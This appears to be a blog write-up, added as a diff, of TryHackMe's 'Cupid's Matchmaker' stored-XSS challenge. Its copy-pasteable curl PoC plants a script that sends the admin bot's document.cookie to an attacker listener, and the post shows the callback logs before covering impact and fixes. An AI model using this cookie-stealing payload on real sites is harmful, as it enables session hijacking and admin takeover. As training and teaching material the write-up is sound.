@@ -1,0 +1,143 @@
+---
+title: "Cupid's Matchmaker"
+description: "An unauthenticated stored-XSS in the public survey form runs in the admin review bot's context and exfiltrates its session cookie — full admin session takeover with no account and no user interaction."
+date: 2026-10-03
+platform: tryhackme
+room: "Cupid's Matchmaker"
+roomUrl: 'https://tryhackme.com/room/lafb2026e3'
+difficulty: easy
+tags:
+  - 'web'
+  - 'xss'
+  - 'stored-xss'
+  - 'cookie-theft'
+  - 'session-hijacking'
+vulnClasses:
+  - 'stored cross-site scripting'
+  - 'missing output encoding'
+  - 'session cookie theft'
+translation: done
+draft: false
+---
+
+## **TryHackMe: Cupid's Matchmaker — Unauthenticated Stored XSS Steals the Admin Bot's Session Cookie**
+
+_A walkthrough of the "Cupid's Matchmaker" web challenge from TryHackMe's Love at First Breach 2026 event. A public matchmaking survey renders submitted fields on an internal admin review page with no output encoding. A headless admin bot opens every new submission automatically, so a_ _`<script>`_ _planted in one survey field runs in the admin's browsing context and beacons its session cookie straight to us — no account, no victim click, no social engineering._
+
+> The flag and the attacker/target IPs are redacted. Cupid's Matchmaker is an authorized training challenge on TryHackMe; everything here was performed against a legal practice target. The flag is shown as `THM{<redacted>}`; the real value was recovered on the box but is withheld here.
+
+---
+
+### **TL;DR — the whole chain**
+
+<Callout type="tldr">
+
+The public `POST /survey` form accepts submissions from anyone **with no authentication**. Those fields are later rendered on an internal `/admin` review page **without output encoding** → a headless **admin review bot** visits every new submission automatically, **zero user interaction** → a `<script>` planted in a survey field (e.g. `ideal_date`) executes in the **admin's browsing context** with the admin cookies attached → the script beacons `document.cookie` to an attacker listener → the **admin session cookie is exfiltrated from an unauthenticated position**, and in this instance the stolen value directly disclosed the room flag.
+
+Anonymous submission → script runs as the admin bot → admin session cookie in under a minute, fully repeatable.
+
+</Callout>
+
+### **The target**
+
+```text
+export IP=<target-ip>
+export ATTACKER_IP=<your-tun0-ip>
+```
+
+Cupid's Matchmaker is a Flask-style matchmaking web app served on port 5000 with a public survey form:
+
+```text
+http://$IP:5000/survey   →  public "find your match" survey (no login)
+```
+
+Any form that collects free-text from the public **and** is reviewed by a human (or a bot) in a privileged back office is a prime candidate for **stored XSS**: the attacker writes, the privileged party reads, and the payload runs on _their_ side of the trust boundary.
+
+### **The vulnerability: survey fields are rendered to the admin without escaping**
+
+The `/survey` endpoint stores whatever you submit and later renders it verbatim on the internal admin review view. Because the submitted fields (`name`, `ideal_date`, `describe_yourself`, `looking_for`, `dealbreakers`, …) are emitted into the admin page **without HTML output encoding** — Jinja2 autoescaping is bypassed via `|safe`/`Markup()` on untrusted input — any HTML/JS in them becomes live markup in the admin's DOM.
+
+<Callout type="insight">
+
+Two properties make this critical rather than a routine stored XSS:
+
+- **No authentication to inject.** The survey is public, so the attacker needs **zero privileges** to plant the payload.
+- **The victim is an automated bot, not a human.** A headless admin review session opens every new submission on its own — **no click, no victim interaction** — and it carries the admin's session cookie. The payload runs in a _different, higher_ security scope than the submitter (a CVSS scope change).
+
+</Callout>
+
+### **Step 1 — stand up a listener on your attacking host**
+
+The payload will beacon the stolen cookie out-of-band, so we need something to catch the callback:
+
+```text
+python3 -m http.server 8000
+# Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+
+### **Step 2 — submit the payload through the public survey (no auth)**
+
+We drop a classic cookie-stealing `<script>` into one of the rendered fields (`ideal_date` works). Everything else is just plausible filler so the submission looks like a normal survey:
+
+```text
+curl -s "http://$IP:5000/survey" \
+  --data-urlencode "name=Eve" \
+  --data-urlencode "age=27" \
+  --data-urlencode "gender=Female" \
+  --data-urlencode "seeking=Any" \
+  --data-urlencode "ideal_date=<script>fetch('http://$ATTACKER_IP:8000/?c='+document.cookie)</script>" \
+  --data-urlencode "describe_yourself=Sweet, simple, honest" \
+  --data-urlencode "looking_for=Someone kind" \
+  --data-urlencode "dealbreakers=none"
+```
+
+That single request is the complete, copy-pasteable PoC. No session, no CSRF token, no prior foothold — just a form POST anyone on the network can send.
+
+### **Step 3 — the admin bot fires the payload back at us**
+
+Within well under a minute the headless admin review session opens the submission, our script runs with the admin's cookies attached, and the listener records the callback **originating from the target itself** — the out-of-band confirmation bar that proves real execution, not a self-inflicted browser render:
+
+```text
+10.x.x.x - - [03/Oct/2026 08:24:08] "GET /?c=flag=THM{<redacted>} HTTP/1.1" 200 -
+10.x.x.x - - [03/Oct/2026 08:25:19] "GET /?c=flag=THM{<redacted>} HTTP/1.1" 200 -
+10.x.x.x - - [03/Oct/2026 08:26:31] "GET /?c=flag=THM{<redacted>} HTTP/1.1" 200 -
+```
+
+The callback arrives from the target's IP every time the bot re-reviews the submission, so the attack is automatic and repeatable until the bug is fixed. The exfiltrated value carried the room flag directly, demonstrating that the admin review context holds sensitive material reachable purely through this injection:
+
+```text
+THM{<redacted>}
+```
+
+Anonymous survey submission → script executes as the admin bot → admin session cookie (and flag) in our listener. Every rung was unauthenticated.
+
+### **Impact**
+
+<Callout type="critical">
+
+**Critical — CVSS 3.1 9.3** (`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N`). Unlike the usual "High" stored-XSS baseline — which assumes the victim has an account (`PR:L`) and must open the page themselves (`UI:R`) — here both of those land at their worst case:
+
+- **Full theft of the admin review bot's session cookie from an unauthenticated position** — equivalent to admin account takeover, since that cookie is the sole credential needed to impersonate the session.
+- **Zero privileges and zero interaction.** The survey is public and the admin bot visits every submission on its own, so this is an automatic, repeatable attack vector, not a one-shot.
+- **Scope change.** The payload executes in the admin review context — a different security scope than the anonymous submitter — which is exactly why this scores Critical rather than the typical High.
+
+</Callout>
+
+### **Recommended fix — encode the output, contain the cookie**
+
+<Callout type="fix">
+
+1. **Escape every user-submitted survey field when rendered on the admin review page.** Rely on Jinja2's default autoescaping and remove any `|safe` / `Markup()` applied to untrusted input (`name`, `ideal_date`, `describe_yourself`, `looking_for`, `dealbreakers`, …). Output encoding at the sink is the real fix.
+2. **Add a Content-Security-Policy** on the admin review view that restricts script sources (no inline script), so even an injected tag cannot execute or beacon out.
+3. **Contain the session cookie.** Mark the review bot's cookie `HttpOnly`, scope it tightly, and keep it short-lived, so a DOM compromise doesn't yield a durable, reusable admin credential.
+
+</Callout>
+
+### **Takeaways**
+
+- **Stored XSS is about** **\*where it renders\*\*\***, not where it's submitted.\*\* A public form that feeds a privileged back-office page lets an anonymous attacker run code in the admin's context.
+- **A review bot is a perfect XSS victim.** It authenticates, it visits every submission, and it never "declines to click" — which pushes the CVSS user-interaction and privilege metrics to their worst case.
+- **Output-encode at the sink.** Escaping on the admin page — not input filtering on the survey — is what actually closes this. `|safe` on untrusted data is how autoescaping gets defeated.
+- **Defense in depth pays off.** A CSP and an `HttpOnly`, short-lived cookie each independently blunt the attack even if an encoding bug slips through.
+
+Thanks for reading. Cupid's Matchmaker is a clean lesson in the real shape of stored XSS: the danger isn't the form you type into, it's the privileged page that renders your text back — and an admin bot that reads everything, no click required.
